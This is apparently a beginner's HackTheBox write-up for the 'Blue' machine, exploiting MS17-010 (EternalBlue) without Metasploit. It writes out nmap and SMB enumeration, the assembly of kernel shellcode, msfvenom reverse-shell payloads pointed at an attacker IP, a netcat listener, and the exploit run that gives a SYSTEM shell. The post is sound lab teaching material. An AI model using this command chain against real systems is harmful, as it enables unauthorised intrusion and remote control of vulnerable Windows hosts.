---
title: "HTB - Blue without MetaSploit"
date: 2021-01-30T16:37:44+01:00
categories: ["hacking","write-ups"]
tags: [HTB]
featuredImage: "/images/2021/02/Blue.png"
aliases:
    - /htb-blue-without-metasploit/
    - /htb-blue/
---
A good ol' vuln to get starting!

This will be my first real tutorial, so I'll try to explain the basics of what I am doing. Please bear in mind that I am very new to hacking, probably like you are. I am merely sharing my knowledge and by doing so I am making sure I understood what I did. Please correct me if you find anything wrong, or ask question if you need to! I'll be happy to engage a discussion.

NB : The following notes use $target_ip = IP of the target machine. This is more convenient when machine changes its IP.

A note about “sudo”. I am a firm believer in the “least privileges” methodology, like never use your admin account on AD domain for day to day use, and never use sudo if you don't need to. For example, search a package with “apt search X” and install it wish "sudo apt install X". However, in case of Kali and nmap, I noticed that in quite often requires root depending of the flag you use. Since, I am no expert (yet), I will l run nmap (and many other Kali tools) with sudo! I do not log in as root, but as a regular user I created but I almost always use “sudo”.

I will process simply by following the 5 stages of Ethical Hacking.

##  Recon

Doing HTB boxes, there will be no proper reconnaissance phase; since Googling for the box will obviously leave to solution which we do not want... Let's just say we can use the name to have a guess. Here, a Windows machine called Blue probably means we'll have to deal with MS17-010.. So I'll pay close attention to anything related to SMB.

##  Enum

Let's fire a quick nmap scan ;

```text
sudo nmap -T4 -p- $target_ip
```

![](/images/2021/01/2021-01-27_14-21.png)

This quick nmap command will scan for all TCP ports, then, once done we will gather more in depth results by adding -A flag on specified ports (the one that responded from the previous step).

```text
sudo nmap -T4 -A -p $target_ip
```

![](/images/2021/01/2021-01-27_14-22.png)

NB : here, I just ignored some high ports 49xxx/tcp because this is not a real life test and I know that what I am looking for is related to SMB (445/tcp).

In parallel, I like to launch a Nessus basic scan on ALL ports (thanks @tcm for the tips) :

![](/images/2021/01/2021-01-27_13-21.png)

Like we guessed, it seems we will have to play with MS17-010 vuln, let's check that with nmap dedicated script :

```text
sudo nmap --script smb-vuln-ms17-010 $target_ip
```

![](/images/2021/01/2021-01-27_14-35.png)

It is becoming more and clear that this machine is vulnerable to ms17-10.

Since saw some SMB running; let's enumerate it :

NB : note the quadruple "", this is because it normally has only 2 but need escaping each time, hence the 4.

```text
smbclient -L $target_ip
```



![](/images/2021/01/2021-01-27_14-42.png)

Since we found a few share let's try to connect to each one of them anonymously, for example with the share called "Share":

```text
smbclient $target_ipShare
```

![](/images/2021/01/2021-01-27_14-46.png)

Keep notes of what shares you have access to. You may differentiate where you have "listing" access and where you don't.

Now let's try to gain exploit this machine.

##  Gaining Access (exploitation)

My goal is to exploit without MetaSploit, if you don't know why, check this blog post.

Searching on the internet, I came around this GitHub that seems to be able to do the job: [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010).

According to the repo we need to install impacket and mysmb, I'll let you do that, then we can use checker.py to see if we find any named pipe (since it is a safe way to exploit this) :

cd into the clone repo then run :

```text
python2 checker.py $target_ip
```

![](/images/2021/01/2021-01-27_14-54.png)

Unfortunately, we have no named pipes available... However, according to the repo :

> **Eternalblue** requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows &lt; 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.
>
> **Eternalchampion** requires access to named pipe. The exploit has no chance to crash a target.
>
> **Eternalromance** requires access to named pipe. The exploit can target Windows &lt; 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
>
> **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).

Remember or recon phase and that Blue machine name? Looks like we are facing EternalBlue : we have seen that we have access to $IPC Share, Windows &lt; 8 (Windows 7 here), and port 445/tcp is open.

In order to exploit this we need to use the following (still according to the repo) :

```text
eternalblue_exploit7.py <ip> <shellcode_file> [numGroomConn]
```

The repo tells us that there is 2 shellcode, one for each arch.

However, we are not really sure which arch is our target. So we will assemble both shellcode :

cd into the shellcode dir and :

```text
nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
```

Once this is done, we create our payloads like so :

```text
msfvenom -p windows/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -f raw -o sc_x86_msf.bin EXITFUNC=thread msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
```

Finally we "join" the two payloads together (with the provided python script from the repo) so that we can check both arch at the same time and hopefully get a shell :

```text
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin python2 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
```

[Many thanks to this website for the info on how to assemble the shellcode](https://redteamzone.com/EternalBlue/).

Now start a listener to receive the reverse shell on port 4444 (or the one you used with he msfvenom command):

```text
nc -lvp 4444
```

Let it open and finally, we run our command with the generated sc_all.bin as payload :

```text
python2 eternalblue_exploit7.py $target_ip ./shellcode/sc_all.bin
```

![](/images/2021/01/2021-01-27_15-45_1.png)

Bingo, we have a shell as `SYSTEM`!

![](/images/2021/01/2021-01-27_15-48.png)

Here, in a normal pentest situation, we would make sure to have a way to maintain access. But this is HackTheBox, we will simply harvest our flags. :)

##  Maintaining Access

Not used here. :)

##  Covering Tracks

Not used here. :)